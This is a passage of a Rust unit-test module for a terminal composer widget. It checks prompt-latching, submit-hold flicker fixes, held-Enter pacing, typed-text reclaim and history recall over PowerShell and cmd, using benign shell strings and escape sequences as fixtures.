        let wake = st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose, "no instant demotion");
        assert!(
            wake.is_some_and(|w| w <= now + DEMOTE),
            "a pending demotion must schedule its own wakeup (idle terminals repaint rarely)"
        );
        st.tick(&b, &recs, true, true, now + DEMOTE - Duration::from_millis(10));
        assert_eq!(st.mode, ComposerMode::Compose);

        // Past the window: demoted, draft intact, episode NOT consumed (a
        // genuine fresh latch may auto-re-arm).
        st.tick(&b, &recs, true, true, now + DEMOTE);
        assert_eq!(
            st.mode,
            ComposerMode::Raw(RawReason::NoPrompt),
            "sustained certainty loss steps Compose down to Raw"
        );
        assert_eq!(st.draft, "keep me", "demotion never destroys the draft");
        assert!(!st.episode_used);
    }

    #[test]
    fn compose_survives_certainty_blip_that_heals() {
        let mut b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);

        // Blip: cursor drifts (conhost repaint mid-flight)…
        b.advance_live(b"x");
        st.tick(&b, &recs, true, true, now + Duration::from_millis(100));
        assert_eq!(st.mode, ComposerMode::Compose);

        // …and heals: a fresh prompt frame re-captures prompt_end exactly
        // where the cursor now sits (the live 133;B path).
        let mut frame = hook_bytes("pre", r#"{"e":0,"n":2,"d":"C:"}"#);
        frame.extend_from_slice(b"\r\nPS C:\\> ");
        frame.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&frame);
        pump_counters(&mut st, &b, now + Duration::from_millis(200));
        assert!(b.cursor_at_prompt_end());

        // Well past DEMOTE from the original blip: still Compose (the clock
        // reset when health returned).
        st.tick(&b, &recs, true, true, now + DEMOTE + Duration::from_millis(200));
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "a healed blip must never demote later"
        );
    }

    /// Held-Enter stress (scope #3, user: "holding enter breaks the entire
    /// lining … puts me in powershell"): ~150 empty-Enter repeats must (a)
    /// never leave Compose (the lane and the arm survive), (b) coalesce to
    /// a CAPPED queue drained at the shell's prompt-render pace, one bare
    /// `\r` per completed round-trip, (c) leave a clean armed state after
    /// release, and (d) abandon the queue if the shell stops re-prompting.
    #[test]
    fn held_enter_paces_spacers_and_never_leaves_compose() {
        let mut b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);

        // 5 seconds of ~30Hz key-repeat, delivered a few per frame.
        let mut dispatched = 0u32;
        let mut t = now;
        for burst in 0..50 {
            for _ in 0..3 {
                st.push_spacer();
            }
            assert!(
                st.pending.len() <= SPACER_QUEUE_CAP,
                "consecutive spacers must coalesce at the cap"
            );
            t += Duration::from_millis(33);
            st.tick(&b, &recs, true, true, t); // resolves a completed window
            if let Some((bytes, spacer)) = st.pump_pending(&b, None, None, t) {
                assert_eq!(bytes, b"\r");
                assert!(spacer);
                dispatched += 1;
                // The shell answers: echo scrolls, fresh prompt renders and
                // re-latches (pre + prompt text + 133;B) — the real pace.
                let json = format!(r#"{{"e":0,"n":{},"d":"C:"}}"#, burst + 10);
                let mut frame = hook_bytes("pre", &json);
                frame.extend_from_slice(b"\r\nPS C:\\> ");
                frame.extend_from_slice(b"\x1b]133;B\x07");
                b.advance_live(&frame);
                pump_counters(&mut st, &b, t);
            }
            st.tick(&b, &recs, true, true, t);
            assert_eq!(
                st.mode,
                ComposerMode::Compose,
                "held Enter must NEVER drop the composer to raw (burst {burst})"
            );
        }
        assert!(
            dispatched >= 10,
            "paced dispatch must make progress at prompt-render pace (got {dispatched})"
        );
        // Release: the residual queue drains and the state stays armed.
        for _ in 0..10 {
            t += Duration::from_millis(50);
            st.tick(&b, &recs, true, true, t);
            if st.pump_pending(&b, None, None, t).is_some() {
                let mut frame = hook_bytes("pre", r#"{"e":0,"n":99,"d":"C:"}"#);
                frame.extend_from_slice(b"\r\nPS C:\\> ");
                frame.extend_from_slice(b"\x1b]133;B\x07");
                b.advance_live(&frame);
                pump_counters(&mut st, &b, t);
            }
            st.tick(&b, &recs, true, true, t);
        }
        assert!(st.pending.is_empty(), "queue fully drained after release");
        assert_eq!(st.mode, ComposerMode::Compose, "armed lane survives the hold");
        assert!(b.cursor_at_prompt_end(), "clean prompt state after release");
    }

    #[test]
    fn spacer_queue_abandons_when_shell_stops_prompting() {
        let b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, true, now);
        for _ in 0..3 {
            st.push_spacer();
        }
        assert!(
            st.pump_pending(&b, None, None, now).is_some(),
            "first \\r goes immediately"
        );
        // No pre ever comes back (hung shell): within the window nothing
        // more is sent; past it the queue is dropped, never blind-fired.
        assert!(st.pump_pending(&b, None, None, now + Duration::from_millis(100)).is_none());
        let late = now + POST_SUBMIT_FLUSH + Duration::from_millis(50);
        st.tick(&b, &recs, true, true, late);
        assert!(st.pending.is_empty(), "abandoned queue");
        assert!(st.take_pending_clear().is_none(), "spacers are never blind-fired");
        assert_eq!(st.mode, ComposerMode::Compose, "abandon is not a yield");
        assert!(
            st.pump_pending(&b, None, None, late + Duration::from_millis(50)).is_none(),
            "nothing left to send"
        );
    }

    #[test]
    fn demote_clock_never_leaks_across_episodes() {
        let mut b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, true, now);
        b.advance_live(b"stray");
        st.tick(&b, &recs, true, true, now); // clock starts
        st.tick(&b, &recs, true, true, now + DEMOTE); // demoted
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::NoPrompt));

        // Fresh episode: new prompt, new arm — an immediately-unhealthy
        // frame must start a NEW clock, not inherit the old timestamp.
        let mut frame = hook_bytes("pre", r#"{"e":0,"n":3,"d":"C:"}"#);
        frame.extend_from_slice(b"\r\nPS C:\\> ");
        frame.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&frame);
        let t1 = now + DEMOTE + Duration::from_millis(100);
        pump_counters(&mut st, &b, t1);
        st.tick(&b, &recs, true, true, t1);
        assert_eq!(st.mode, ComposerMode::Compose, "fresh latch re-arms");
        b.advance_live(b"y");
        st.tick(&b, &recs, true, true, t1 + Duration::from_millis(10));
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "a stale clock from the previous episode must not instant-demote"
        );
    }

    /// Latch the composer's counters from the backend's live feed state.
    fn pump_counters(st: &mut ComposerState, b: &TermBackend, now: Instant) {
        let f = b.block_feed.as_ref().unwrap();
        st.on_stream_events(f.pre_seen, f.exec_seen, now);
    }

    /// THE submit-flicker regression (user-reported twice): ConPTY delivers
    /// the exec OSC ahead of the asynchronously-rendered echo text, so the
    /// hook counter advancing must NOT release the hold while the covered
    /// row is still the bare prompt — and a partially rendered echo (less
    /// text than submitted) must keep holding too. Only the full echo in the
    /// row's cells releases.
    #[test]
    fn hold_survives_exec_hook_before_echo() {
        let mut b = backend_at_clean_prompt(); // "PS C:\> " row 0, prompt_end (0, 8)
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "echo hi".into();
        let (bytes, _) = st.submit(&b, cover_line_for(&st, &b, true, now), Some("C:\\"));
        assert_eq!(bytes, b"echo hi\r");
        assert_eq!(st.hold_line(&b, now), Some(0), "hold pinned to the prompt row");

        // exec hook scanned FIRST (ConPTY reorder); echo not yet rendered.
        b.advance_live(&hook_bytes("exec", r#"{"c":"echo hi"}"#));
        pump_counters(&mut st, &b, now);
        st.tick(&b, &recs, true, false, now);
        assert_eq!(
            st.hold_line(&b, now),
            Some(0),
            "exec hook alone must NOT release: the row under the cover is still bare"
        );

        // Partial echo: the row shows LESS text than submitted — keep holding.
        b.advance_live(b"ec");
        st.tick(&b, &recs, true, false, now);
        assert_eq!(st.hold_line(&b, now), Some(0), "partial echo must keep the hold");

        // Full echo in the row's cells ⇒ release, pixel-continuous swap.
        b.advance_live(b"ho hi");
        st.tick(&b, &recs, true, false, now);
        assert_eq!(st.hold_line(&b, now), None, "echo landing releases the hold");
    }

    /// SubmitHold backstops: cursor leaving the pinned row and grid scroll
    /// both prove the echo has been parsed (text renders in stream order
    /// before the accept-newline); the 250ms cap covers everything else;
    /// a coverless submit never creates a hold.
    #[test]
    fn submit_hold_backstops() {
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();

        // Cursor left the row ⇒ release even without a cell match.
        let mut b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "cls".into();
        let _ = st.submit(&b, Some(0), None);
        assert_eq!(st.hold_line(&b, now), Some(0));
        b.advance_live(b"\r\n");
        st.tick(&b, &recs, true, false, now);
        assert_eq!(st.hold_line(&b, now), None, "cursor below the row releases");

        // Grid scroll (prompt on the bottom row) ⇒ release: the pinned line
        // is stale and the echo preceded the scrolling newline.
        let mut b = TermBackend::new(GridSize {
            cols: 40,
            rows: 4,
            cell_width: 8.0,
            cell_height: 16.0,
        });
        b.advance(b"a\r\nb\r\nc\r\nPS> "); // cursor on row 3 (bottom)
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.draft = "quux".into();
        let _ = st.submit(&b, Some(3), None);
        assert_eq!(st.hold_line(&b, now), Some(3));
        b.advance(b"\r\nout"); // bottom-row newline: rows scroll into history
        assert!(b.history_size() > 0, "test must actually scroll");
        st.tick(&b, &recs, true, false, now);
        assert_eq!(st.hold_line(&b, now), None, "grid scroll releases");

        // Safety cap: nothing observable ever arrives.
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "slow".into();
        let _ = st.submit(&b, Some(0), None);
        assert_eq!(st.hold_line(&b, now), Some(0));
        // h.since is stamped inside submit(), after `now` — probe from a
        // fresh Instant so the cap has provably elapsed.
        let later = Instant::now() + SUBMIT_HOLD_MAX + Duration::from_millis(1);
        assert_eq!(st.hold_line(&b, later), None, "hold expires at the cap");

        // no cover ⇒ no hold (fallback lane submit doesn't flicker).
        let bb = TermBackend::new(GridSize::default());
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.draft = "x".into();
        let _ = st.submit(&bb, None, None);
        assert_eq!(st.hold_line(&bb, now), None);
    }

    /// P6b §5.2: Cmd-family submissions route through the SubmitCommand
    /// ledger — dispatch produces ZERO PTY bytes, parks the command on the
    /// once-draining outbox, and keeps every hold/window mechanic (the shell
    /// echo lands in the grid the same way, so the cover bridge is family-
    /// agnostic). The blind-queue pump inherits the routing (shared core).
    #[test]
    fn cmd_submission_routes_to_ledger() {
        let b = backend_at_clean_prompt();
        let now = Instant::now();
        let mut st = ComposerState {
            is_cmd: true,
            ..Default::default()
        };
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "dir".into();
        let (bytes, spacer) = st.submit(&b, Some(0), Some("C:\\"));
        assert!(bytes.is_empty(), "cmd submission must carry no PTY bytes");
        assert!(!spacer);
        assert_eq!(st.take_submit_cmd().as_deref(), Some("dir"));
        assert!(st.take_submit_cmd().is_none(), "the outbox drains once");
        assert!(st.buffering(), "the typeahead window opens exactly like pwsh");
        assert_eq!(st.hold_line(&b, now), Some(0), "SubmitHold pins the cover");
        assert_eq!(st.mode, ComposerMode::Compose);
    }

    /// P6b §6: the spacer gesture stays an honest bare `\r` Input (a blank
    /// line is not a command — no ledger record), and a multi-line dispatch
    /// (pasted `\n`, a multi-line history Run) REFUSES — restored to the
    /// visible draft, nothing fires uninspected, nothing is lost.
    #[test]
    fn cmd_spacer_and_multiline_rules() {
        let b = backend_at_clean_prompt();
        let mut st = ComposerState {
            is_cmd: true,
            ..Default::default()
        };
        pump_counters(&mut st, &b, Instant::now());
        st.mode = ComposerMode::Compose;
        let (bytes, spacer) = st.submit(&b, Some(0), None);
        assert_eq!(bytes, b"\r", "spacer = bare Enter, never a record");
        assert!(spacer);
        assert!(st.take_submit_cmd().is_none());
        st.post_submit = None;
        st.draft = "cd \\\ndir".into();
        let (bytes, spacer) = st.submit(&b, Some(0), None);
        assert!(bytes.is_empty() && !spacer);
        assert!(st.take_submit_cmd().is_none());
        assert_eq!(
            st.draft, "cd \\\ndir",
            "the refused multi-line submission returns to the draft"
        );
        assert!(
            st.post_submit.is_none(),
            "a refused dispatch must not open a submit window"
        );
    }

    /// P6b D15: activate() over a dirty prompt clears the line with ESC on
    /// cmd (in-place clear, no ^C splatter, no re-prompt needed) — win32
    /// KEY_EVENT pair under mode 9001, bare 0x1b otherwise; other families
    /// keep the Ctrl+C CancelLine.
    #[test]
    fn cmd_line_clear_chord_is_escape() {
        use egui::{Key, Modifiers};
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"di"); // typed junk: cursor off the prompt end
        assert!(!b.cursor_at_prompt_end());
        let mut st = ComposerState {
            is_cmd: true,
            ..Default::default()
        };
        assert_eq!(st.activate(&b), vec![0x1b], "VT mode: bare ESC");
        b.win32_input = true;
        let mut st = ComposerState {
            is_cmd: true,
            ..Default::default()
        };
        assert_eq!(
            st.activate(&b),
            crate::win32_input::encode_key(Key::Escape, Modifiers::NONE).unwrap()
        );
        let mut st = ComposerState::default();
        assert_eq!(
            st.activate(&b),
            crate::win32_input::encode_key(Key::C, Modifiers::CTRL).unwrap(),
            "non-cmd families keep Ctrl+C"
        );
    }

    /// P6b: the observed-raw Enter detector behind the write:false capture —
    /// literal `\r` in both modes (VT Enter, pasted newlines under 9001) and
    /// the win32 VK_RETURN key-DOWN record; key-up alone and other keys
    /// never trigger.
    #[test]
    fn enter_detector_both_modes() {
        use egui::{Key, Modifiers};
        assert!(bytes_contain_enter(b"dir\r", false));
        assert!(!bytes_contain_enter(b"dir", false));
        assert!(bytes_contain_enter(b"abc\rdef", true), "pasted \\r counts under 9001");
        let enc = crate::win32_input::encode_key(Key::Enter, Modifiers::NONE).unwrap();
        assert!(bytes_contain_enter(&enc, true));
        // A key-UP-only record (Kd=0) is not a press.
        assert!(!bytes_contain_enter(b"\x1b[13;28;13;0;0;1_", true));
        let esc = crate::win32_input::encode_key(Key::Escape, Modifiers::NONE).unwrap();
        assert!(!bytes_contain_enter(&esc, true));
        // Truncated/garbage records never panic or false-positive.
        assert!(!bytes_contain_enter(b"\x1b[13;28", true));
        assert!(!bytes_contain_enter(b"\x1b[x;y;z;w_", true));
    }

    /// Regression for the cover paint gate: a live SubmitHold must keep the
    /// cover independent of the armed chain (comp_active false — e.g. an
    /// Esc-yield mid-hold). Gating the cover on the armed chain alone would
    /// pass the hold's state-machine tests yet drop the cover the instant
    /// Enter is pressed — flicker with green tests.
    #[test]
    fn cover_gate_includes_submit_hold() {
        let b = backend_at_clean_prompt();
        let now = Instant::now();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        // Armed chain: cover on the captured prompt-end row.
        assert_eq!(cover_line_for(&st, &b, true, now), Some(0));
        // Not comp_active and no hold ⇒ no cover.
        assert_eq!(cover_line_for(&st, &b, false, now), None);
        // Submit: Compose is kept (typeahead) and the hold pins the cover
        // even under comp_active=false (mode-independent, as before).
        st.draft = "echo hi".into();
        let cl = cover_line_for(&st, &b, true, now);
        let _ = st.submit(&b, cl, Some("C:\\"));
        assert_eq!(st.mode, ComposerMode::Compose);
        assert_eq!(
            cover_line_for(&st, &b, false, now),
            Some(0),
            "a live SubmitHold must keep the cover regardless of mode"
        );
        // Cap expiry ends the pinned cover too (fresh Instant: h.since is
        // stamped inside submit(), after `now`).
        let later = Instant::now() + SUBMIT_HOLD_MAX + Duration::from_millis(1);
        assert_eq!(cover_line_for(&st, &b, false, later), None);
    }

    /// Empty/whitespace Enter is the "more lines" spacing gesture: it sends a
    /// bare `\r` (honest shell newline), keeps Compose with the typeahead
    /// window open, and reports `spacer` so the app blanks the row — but
    /// never creates a ghost hold (the blank spacer, not a text ghost,
    /// bridges the re-prompt).
    #[test]
    fn empty_draft_submit_sends_cr_and_flags_spacer() {
        let b = backend_at_clean_prompt();
        let now = Instant::now();
        for draft in ["", "   ", "\n", " \r\n "] {
            let mut st = ComposerState::default();
            pump_counters(&mut st, &b, now);
            st.mode = ComposerMode::Compose;
            st.draft = draft.into();
            let (bytes, spacer) = st.submit(&b, Some(0), Some("C:\\"));
            assert_eq!(bytes, b"\r", "spacing gesture sends a bare CR ({draft:?})");
            assert!(spacer, "empty submit flags the spacer gesture ({draft:?})");
            assert_eq!(st.hold_line(&b, now), None, "no ghost hold for the gesture");
            assert_eq!(st.mode, ComposerMode::Compose);
            assert!(st.buffering());
        }
    }

    /// The flicker fix: a real submit's hold, once the echo is grid-verified
    /// on the row, is queued as a PERMANENT history cover (so the row keeps
    /// `❯ cmd` styling and never reverts to raw `PS …>`). Multi-line and
    /// unverifiable releases do NOT convert.
    #[test]
    fn released_hold_converts_to_history_cover() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();

        // Single-line, echo lands on the row ⇒ conversion queued.
        let mut b = backend_at_clean_prompt(); // prompt_end (0, 8)
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "echo hi".into();
        let _ = st.submit(&b, cover_line_for(&st, &b, true, now), Some("C:\\"));
        b.advance_live(b"echo hi"); // shell echoes the command on the prompt row
        st.tick(&b, &recs, true, false, now);
        assert_eq!(st.hold_line(&b, now), None, "echo landed ⇒ released");
        assert_eq!(
            st.take_pending_history_cover(),
            Some((0, 8, Some("C:\\".to_string()), "echo hi".to_string())),
            "grid-verified single-line command converts to a history cover"
        );

        // Cap release with the echo NOT on the row ⇒ no conversion (honest
        // raw row rather than a wrong `❯ cmd`).
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "never echoed".into();
        let _ = st.submit(&b, Some(0), Some("C:\\"));
        let later = Instant::now() + SUBMIT_HOLD_MAX + Duration::from_millis(1);
        st.tick(&b, &recs, true, false, later);
        assert_eq!(st.hold_line(&b, later), None);
        assert_eq!(
            st.take_pending_history_cover(),
            None,
            "an unverifiable cap release must not fabricate a history cover"
        );

        // Multi-line command ⇒ not converted (wrap-chain remap is out of
        // scope; releasing to raw is honest).
        let mut b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "line1\nline2".into();
        let _ = st.submit(&b, Some(0), Some("C:\\"));
        b.advance_live(b"line1"); // first line echoes
        st.tick(&b, &recs, true, false, now);
        assert_eq!(
            st.take_pending_history_cover(),
            None,
            "multi-line submissions are not converted to history covers"
        );
    }

    /// Cold-attach arm (task #15): a daemon-seeded prompt_end + on_attach_prompt
    /// auto-arms when the replayed cursor sits at the prompt end (clean), stays
    /// manual when it is past it (dirty), and is overruled by an open block
    /// (the restored-wrapper case).
    #[test]
    fn cold_attach_prompt_state_arms() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();

        let seeded = |tail: &[u8], pe: usize| {
            let mut b = TermBackend::new(GridSize::default());
            b.set_stream_pos(0);
            b.enable_block_scan();
            b.advance(tail); // replay reconstruction (no live 133;B)
            b.seed_prompt_end(0, pe);
            b
        };

        // Clean: replayed cursor at the seeded prompt end ⇒ auto-arm.
        let b = seeded(b"PS C:\\> ", 8);
        let mut st = ComposerState::default();
        st.on_attach_prompt(now);
        assert!(st.at_prompt_latched());
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose, "clean cold-attach auto-arms");

        // Dirty: replayed cursor past the prompt end (typed input) ⇒ manual.
        let b = seeded(b"PS C:\\> ls", 8);
        let mut st = ComposerState::default();
        st.on_attach_prompt(now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(
            st.mode,
            ComposerMode::Raw(RawReason::NoPrompt),
            "a dirty cold-attach stays manual-arm"
        );

        // Open block (restored claude wrapper): the daemon certifies
        // at_prompt=false whenever a block is open, so NO latch arrives on
        // attach — and without the latch the busy gate blocks arming. (A
        // LIVE latch would feed-time-close the rec per F7: a scanned pre IS
        // the daemon's own close signal.)
        let b = seeded(b"PS C:\\> ", 8);
        let mut st = ComposerState::default();
        let open = vec![BlockRec {
            end_off: None,
            ..rec("claude")
        }];
        st.tick(&b, &open, true, true, now);
        assert_ne!(st.mode, ComposerMode::Compose, "an open block blocks arming");
    }

    /// The visible-^C reclaim is DEAD for normal typing (typeahead fix #3):
    /// a raw key at a latched prompt leaves the composer ManualOnly with NO
    /// automatic chord and NO auto-arm — post-submit typing buffers in the
    /// editor now, so raw text at a prompt is genuinely user-typed and its
    /// reclaim stays strictly click-gated (`activate`, outcome announced on
    /// the strip). No `PS …> f^C` churn ever appears in scrollback from
    /// fast typing.
    #[test]
    fn raw_key_at_prompt_stays_manual_no_auto_chord() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();

        // prompt_end captured (0,8) with a raw key ("l") echoed past it.
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"l");
        assert!(!b.cursor_at_prompt_end(), "cursor is now dirty (echo)");

        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::NoPrompt));
        st.on_raw_input(now); // the key went raw; user chose the grid
        assert!(st.episode_used);
        // Arm frame and well beyond: ManualOnly — no chord, no arm, ever.
        for dt in [0u64, 100, 500, 1000] {
            st.tick(&b, &recs, true, true, now + Duration::from_millis(dt));
            assert_eq!(
                st.mode,
                ComposerMode::Raw(RawReason::NoPrompt),
                "raw typing at a prompt is honoured — never auto-reclaimed (+{dt}ms)"
            );
            assert!(
                st.take_pending_clear().is_none(),
                "NO automatic clear chord may ever fire (+{dt}ms)"
            );
        }
        assert!(st.episode_used, "the episode stays spent");

        // The click-gated path still recovers the text + ships the chord —
        // the ONE sanctioned reclaim (user-initiated, outcome pre-announced).
        let bytes = st.activate(&b);
        assert_eq!(bytes, vec![0x03], "chord ships only on the explicit click");
        assert_eq!(st.draft, "l", "the typed text is reclaimed into the draft");
        assert_eq!(st.mode, ComposerMode::Compose);

        // Deliberate yield (UserRaw) then a raw key: stays raw.
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.blur_to_grid(); // explicit ⌨/Esc yield ⇒ UserRaw + episode used
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::UserRaw));
        st.on_raw_input(now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(
            st.mode,
            ComposerMode::Raw(RawReason::UserRaw),
            "a deliberate yield is never reclaimed"
        );
        assert!(st.take_pending_clear().is_none());
    }

    /// R1 regression: cold-attach announces the UN-shrunk grid (the terminal
    /// isn't known-hooked yet), then the next frame's corrective strip-resize
    /// shrinks it. The cold-attach seed (prompt_end) must SURVIVE that resize —
    /// otherwise cursor_at_prompt_end goes false and the armed composer drops
    /// to the strip with the bare `PS …>` prompt still showing (the two-prompt
    /// boot look). cover_line_for must stay Some across the resize.
    #[test]
    fn cold_attach_cover_survives_corrective_strip_resize() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = TermBackend::new(GridSize {
            cols: 80,
            rows: 24,
            cell_width: 8.0,
            cell_height: 16.0,
        });
        b.set_stream_pos(0);
        b.enable_block_scan();
        b.advance(b"line1\r\nline2\r\nPS C:\\> "); // restored screen; cursor (2, 8)
        b.seed_prompt_end(2, 8);
        let mut st = ComposerState::default();
        st.on_attach_prompt(now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose, "cold attach arms");
        assert_eq!(
            cover_line_for(&st, &b, true, now),
            Some(2),
            "cover on before the corrective resize"
        );
        // The one corrective strip-resize (shrink ~2 rows for STRIP_H).
        b.resize_to(egui::vec2(80.0 * 8.0, 22.0 * 16.0), egui::vec2(8.0, 16.0));
        assert!(
            cover_line_for(&st, &b, true, now).is_some(),
            "R1: the corrective strip-resize wiped the cold-attach seed → cover dropped to the strip"
        );
    }

    /// Bug 4: yield-to-raw is exclusively Esc / the ⌨ toggle (blur_to_grid)
    /// or actual raw PTY bytes (on_raw_input) — both consume the episode.
    /// Pointer interaction (clicks, drag-select, wheel) has NO ComposerState
    /// hook at all: frames pass, the arm + draft + prompt latch stay exactly
    /// as they were, and only the next `pre` re-opens a blurred episode.
    #[test]
    fn pointer_never_disarms_blur_consumes_episode() {
        let b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        let f = b.block_feed.as_ref().unwrap();
        let (pre0, exec0) = (f.pre_seen, f.exec_seen);
        st.on_stream_events(pre0, exec0, now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);
        st.draft = "half-written".into();
        // Frames pass while the user selects scrollback / scrolls (the cover
        // may drop presentationally, but no state hook fires): armed, draft
        // and latch untouched.
        for _ in 0..3 {
            st.tick(&b, &recs, true, false, now);
        }
        assert_eq!(st.mode, ComposerMode::Compose);
        assert_eq!(st.draft, "half-written");
        assert!(st.at_prompt_latched());
        // Esc / ⌨ consume the episode: no auto-re-arm fight for the rest of
        // this prompt episode…
        st.blur_to_grid();
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::UserRaw));
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::UserRaw));
        assert_eq!(st.draft, "half-written", "draft survives the blur");
        // …until the next pre re-opens it and the gate re-arms.
        st.on_stream_events(pre0 + 1, exec0, now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);
    }

    fn rec(cmd: &str) -> BlockRec {
        BlockRec {
            epoch: 1,
            n: 0,
            cmd: cmd.into(),
            cwd: None,
            exit: Some(0),
            started_ms: 0,
            ended_ms: Some(1),
            start_off: 0,
            end_off: Some(1),
            truncated: false,
        }
    }

    // ── Typeahead reclaim at activation (P4 §2.4) ────────────────────

    /// A dirty prompt's exactly-recoverable text is pulled into an empty
    /// draft; the clear chord still ships; the mode arms.
    #[test]
    fn activate_reclaims_into_empty_draft() {
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"dir /w"); // stray typed text echoed at the prompt
        assert!(!b.cursor_at_prompt_end());
        let mut st = ComposerState::default();
        let now = Instant::now();
        pump_counters(&mut st, &b, now);
        let bytes = st.activate(&b);
        assert_eq!(bytes, vec![0x03], "clear chord ships on a dirty activate");
        assert_eq!(st.draft, "dir /w", "typed text reclaimed into the draft");
        assert_eq!(st.mode, ComposerMode::Compose);
        assert!(st.caret_to_end, "caret goes to the end of the reclaim");
        assert!(st.want_focus);
    }

    /// Reclaim never destroys an existing draft: the fragment appends on its
    /// own line (D5 / open question 4) and any recall walk resets.
    #[test]
    fn activate_appends_below_existing_draft() {
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"typed");
        let mut st = ComposerState {
            draft: "held".into(),
            ..Default::default()
        };
        st.recall = Some((RecallSrc::Recs(0), "old".into()));
        let now = Instant::now();
        pump_counters(&mut st, &b, now);
        let bytes = st.activate(&b);
        assert_eq!(bytes, vec![0x03]);
        assert_eq!(st.draft, "held\ntyped", "reclaim appends, never replaces");
        assert!(st.caret_to_end);
        assert!(st.recall.is_none(), "reclaim is an edit: recall walk resets");
    }

    /// Refusal variants (multi-line here) fall back to v1's discard: draft
    /// untouched, chord returned, mode armed.
    #[test]
    fn activate_falls_back_to_discard() {
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"echo 'abc\r\n>> more"); // continuation prompt shape
        assert_eq!(b.reclaim_text(), crate::gui::term_backend::Reclaim::MultiLine);
        let mut st = ComposerState {
            draft: "held".into(),
            ..Default::default()
        };
        let bytes = st.activate(&b);
        assert_eq!(bytes, vec![0x03], "v1 discard: chord still ships");
        assert_eq!(st.draft, "held", "no guessed text ever enters the draft");
        assert_eq!(st.mode, ComposerMode::Compose);
        // A clean prompt activate stays byte-free (v1 unchanged).
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        assert!(st.activate(&b).is_empty());
    }

    /// History insert stashes the displaced draft in the recall slot;
    /// ArrowDown restores it; an edit (model-level: submit) drops the stash;
    /// inserting over an empty draft stashes nothing.
    #[test]
    fn insert_history_stashes_and_restores() {
        let recs: Vec<BlockRec> = ["a", "b"].iter().map(|c| rec(c)).collect();
        let mut st = ComposerState {
            draft: "half-typed".into(),
            ..Default::default()
        };
        st.insert_history("git push");
        assert_eq!(st.draft, "git push");
        assert!(st.caret_to_end);
        assert!(st.want_focus);
        assert_eq!(
            st.recall,
            Some((RecallSrc::History, "half-typed".to_string()))
        );
        // ArrowDown past-newest restores the stash directly.
        st.recall_next(&recs);
        assert_eq!(st.draft, "half-typed");
        assert!(st.recall.is_none());
        // ArrowUp from a History stash walks from the newest rec, stash kept.
        let mut st = ComposerState {
            draft: "half-typed".into(),
            ..Default::default()
        };
        st.insert_history("git push");
        st.recall_prev(&recs);
        assert_eq!(st.draft, "b", "History recall walk starts at the newest rec");
        st.recall_next(&recs);
        assert_eq!(
            st.draft, "half-typed",
            "past-newest restores the SAVED string for both sources (spec §7.2)"
        );
